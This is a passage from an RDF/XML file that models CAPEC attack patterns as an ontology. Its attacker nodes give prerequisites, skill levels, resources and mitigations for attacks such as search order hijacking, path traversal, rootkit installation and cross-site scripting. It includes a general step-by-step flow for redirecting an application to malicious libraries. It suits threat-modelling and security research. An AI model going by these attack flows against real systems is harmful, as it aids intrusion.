    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker245">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#37"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack245"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::311::525::312::314::315::318::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::In order to feasibly execute this type of attack  some valuable data must be present in client software.::Additionally  this information must be unprotected  or protected in a flawed fashion  or through a mechanism that fails to resist reverse engineering  statistical  or other attack.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker must possess knowledge of client code structure as well as ability to reverse-engineer or decompile it or probe it in other ways. This knowledge is specific to the technology and language used for the client distribution:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must possess access to the system or code being exploited. Such access  for this set of attacks  will likely be physical. The attacker will make use of reverse engineering technologies  perhaps for data or to extract functionality from the binary. Such tool use may be as simple as Strings or a hex editor. Removing functionality may require the use of only a hex editor  or may require aspects of the toolchain used to construct the application: for instance the Adobe Flash development environment. Attacks of this nature do not require network access or undue CPU  memory  or other hardware-based resources.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker112">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#243"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack112"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::83::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must fail to adequately sanitize HTML attributes against the presence of dangerous commands.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker82">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#471">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:159::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Search Order Hijacking"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack82">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#471"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::427::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Identify target general susceptibility) An attacker uses an automated tool or manually finds whether the target application uses dynamically linked libraries and the configuration file or look up table (such as Procedure Linkage Table) which contains the entries for dynamically linked libraries.TECHNIQUE:The attacker uses a tool such as the OSX otool utility or manually probes whether the target application uses dynamically linked libraries.:TECHNIQUE:The attacker finds the configuration files containing the entries to the dynamically linked libraries and modifies the entries to point to the malicious libraries the attacker crafted.::STEP:2:PHASE:Experiment:DESCRIPTION:(Craft malicious libraries) The attacker uses knowledge gained in the Explore phase to craft malicious libraries that he will redirect the target to leverage. These malicious libraries could have the same APIs as the legitimate library and additional malicious code.TECHNIQUE:The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using sleep(2) and usleep() to prepare the appropriate conditions for the attack  or make the application perform expansive tasks (large files parsing  etc.) depending on the purpose of the application.::STEP:3:PHASE:Exploit:DESCRIPTION:(Redirect the access to libraries to the malicious libraries) The attacker redirects the target to the malicious libraries he crafted in the Experiment phase. The attacker will be able to force the targeted application to execute arbitrary code when the application attempts to access the legitimate libraries.TECHNIQUE:The attacker modifies the entries in the configuration files pointing to the malicious libraries he crafted.:TECHNIQUE:The attacker leverages symlink/timing issues to redirect the target to access the malicious libraries he crafted. See also: CAPEC-132.:TECHNIQUE:The attacker leverages file search path order issues to redirect the target to access the malicious libraries he crafted. See also: CAPEC-38.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::427::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Attacker has a mechanism to place its malicious libraries in the needed location on the file system.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Ability to create a malicious library.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker111">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#594"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack111"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::940::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must leverage an open communications channel.::The channel on which the target communicates must be vulnerable to interception (e.g.  man in the middle attack).::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A tool  such as a MITM Proxy  that is capable of generating and injecting custom inputs to be used in the attack.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker377">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#75">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:176::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Manipulating Writeable Configuration Files"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack377">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#75"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::349::99::77::346::353::354::713::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::349::99::77::346::353::354::713::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Configuration files must be modifiable by the attacker::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To identify vulnerable configuration files  and understand how to manipulate servers and erase forensic evidence:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker244">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#204"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack244"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::524::311::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must store sensitive information in a cache.::The cache must be inadequately protected against attacker access.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must be able to reach the target application&apos;s cache. This may require prior access to the machine on which the target application runs. If the cache is encrypted  the attacker would need sufficient computational resources to crack the encryption. With strong encryption schemes  doing this could be intractable  but weaker encryption schemes could allow an attacker with sufficient resources to read the file.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker81">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#478"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack81"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have the capability to write to the Windows Registry on the targeted system.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker243">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#310"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack243"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to the network on which the targeted system resides.::Software tools used to probe systems over a range of ports and protocols.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To probe a system remotely without detection requires careful planning and patience.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::Probing requires the ability to interactively send and receive data from a target  whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker110">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#596"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack110"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::940::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An On/In Path Device::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker376">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#636"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack376"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The operating system must support a file system that allows for alternate data storage for a file.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Carefully review the service&apos;s implementation before making it available to user. For instance you can use manual or automated code review to uncover vulnerabilities such as buffer overflow.::Use a language or compiler that performs automatic bounds checking.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Compiler-based canary mechanisms such as StackGuard  ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking  it is not a complete solution.::Operational: Use OS-level preventative functionality. Not a complete solution.::Apply the latest patches to your user exposed services. This may not be a complete solution  especially against a zero day attack.::Do not unnecessarily expose services.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack463"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker197">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#601"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack197"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker84">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#552">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:542::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Install Rootkit "/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack84">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#552"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker195">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#301"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack195"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary requires logical access to the target network. The TCP connect Scan requires the ability to connect to an available port and complete a &apos;three-way-handshake&apos; This scanning technique does not require any special privileges in order to perform. This type of scan works against all TCP/IP stack implementations.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary can leverage a network mapper or scanner  or perform this attack via routine socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network to see the response.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To avoid HTTP Response Splitting  the application must not rely on user-controllable input to form part of its output response stream. Specifically  response splitting occurs due to injection of CR-LF sequences and additional headers. All data arriving from the user and being used as part of HTTP response headers must be subjected to strict validation that performs simple character-based as well as semantic filtering to strip it of malicious character sequences and headers.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack476"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker83">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#633"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack83"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::287::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This pattern of attack is only applicable when a downstream user leverages tokens to verify identity  and then takes action based on that identity.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker196">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#126">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:153::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Path Traversal"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack196">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#126"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::22::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Integrity Confidentiality Availability Execute Unauthorized Commands The attacker may be able to create or overwrite critical files that are used to execute code  such as programs or libraries.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data The attacker may be able to overwrite or create critical files  such as programs  libraries  or important data. If the targeted file is used for a security mechanism  then the attacker may be able to bypass that mechanism. For example  appending a new account at the end of a password file may allow an attacker to bypass authentication.::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism  then the attacker may be able to bypass that mechanism. For example  by reading a password file  the attacker could conduct brute force password guessing attacks in order to break into an account on the system.::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:NOTE:Availability Unreliable Execution The attacker may be able to overwrite  delete  or corrupt unexpected critical files such as programs  libraries  or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication  it has the potential to lockout every user of the software.::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::22::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must be able to control the path that is requested of the target.::The target must fail to adequately sanitize incoming paths::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Simple command line attacks or to inject the malicious payload in a web page.:LEVEL:Low::SKILL:Customizing attacks to bypass non trivial filters in the application.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The ability to manually manipulate path information either directly through a client application relative to the service or application or via a proxy application.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker194">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#425"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack194"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The adversary must have the means and knowledge of how to communicate with the target in some manner.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker86">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#203"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack86"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::15::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted application must rely on values stored in a registry.::The adversary must have a means of elevating permissions in order to access and modify registry content through either administrator privileges (e.g.  credentialed access)  or a remote access tool capable of editing a registry through an API.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary requires privileged credentials or the development/acquiring of a tailored remote access tool.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Obfuscate network traffic through encryption to prevent its readability by network sniffers.::Employ appropriate levels of segmentation to your network in accordance with best practices.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack395"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Identify programs that may be used to acquire account information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack95">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#575">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:169::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Account Footprinting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker193">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#199"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack193"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::87::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Target client software must allow scripting such as JavaScript.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To inject the malicious payload in a web page:LEVEL:Low::SKILL:To bypass non trivial filters in the application:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to send HTTP request to a web application.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use browser technologies that do not allow client side scripting.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Perform input validation for all remote content.::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Scan dynamically generated content against validation specification::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack219"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker85">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#479"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack85"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have the ability to create a new root certificate.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker370">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#623"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack370"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::201::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::Proximal access to the device.::"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Sophisticated attack.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Make sure that HTTPS is used to communicate with the target system. Alternatively  use VPN if possible. It is important to ensure that all communication between the client and the server happens via an encrypted secure channel.::Modify the session token with each transmission and protect it with cryptography. Add the idea of request sequencing that gives the server an ability to detect replay attacks.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack414"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker88">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#242"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack88"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::94::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target software does not validate user-controlled input such that the execution of a process may be altered by sending code in through legitimate data channels  using no other mechanism.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker87">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#647"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack87"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::285::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have obtained logical access to the system by some means (e.g.  via obtained credentials or planting malware on the system).::The adversary must have capability to navigate the operating system to peruse the registry.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Once the adversary has logical access (which can potentially require high knowledge and skill level)  the adversary needs only the capability and facility to navigate the system through the OS graphical user interface or the command line.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: IP Pinning causes browsers to record the IP address to which a given name resolves and continue using this address regardless of the TTL set in the DNS response. Unfortunately  this is incompatible with the design of some legitimate sites.::Implementation: Reject HTTP request with a malicious Host header.::Implementation: Employ DNS resolvers that prevent external names from resolving to internal addresses.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack171"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.::Implementation: Disable altogether the use of inline DTD schemas in your XML parsing objects. If must use DTD  normalize  filter and white list and parse with methods and routines that will detect entity expansion from untrusted sources.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack329"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker199">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#560"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack199"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::522::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Follow the defensive programming practices needed to protect an application accessing the database from SQL injection Configuration: Ensure that the DBMS is patched with the latest security patches Design: Ensure that the DBMS login used by the application has the lowest possible level of privileges in the DBMS Design: Ensure that DBMS runs with the lowest possible level of privileges on the host machine and that it runs as a separate user Usage: Do not use the DBMS machine for anything else other than the database Usage: Do not place any trust in the database host on the internal network. Authenticate and validate all network activity originating from the database host. Usage: Use an intrusion detection system to monitor network connections and logs on the database host. Implementation: Remove / disable all unneeded / unused functions of the DBMS system that may allow an attacker to elevate privileges if compromised::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack282"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Enforce principle of least privilege::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories  programs  and interfaces that grant direct access to executables.::Implementation: Implement host integrity monitoring to detect any unwanted altering of configuration files.::Implementation: Ensure that files that are not required to execute  such as configuration files  are not over-privileged  i.e. not allowed to execute.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack214"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker198">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#422"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack198"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The adversary must have the means and knowledge of how to communicate with the target in some manner.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
